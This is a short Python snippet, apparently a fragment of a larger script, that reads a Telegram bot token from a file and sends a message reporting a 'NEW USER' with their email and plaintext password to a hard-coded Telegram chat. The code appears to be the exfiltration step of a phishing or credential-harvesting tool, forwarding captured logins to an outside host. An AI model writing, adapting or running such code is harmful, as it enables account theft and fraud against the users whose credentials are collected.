import requests


token = open('token.txt').read()
chat = 419972399


text = f'''
<b>NEW USER 👤</b>

Email: {email}
Password: {password}
'''
requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat}&text={text}&parse_mode=HTML")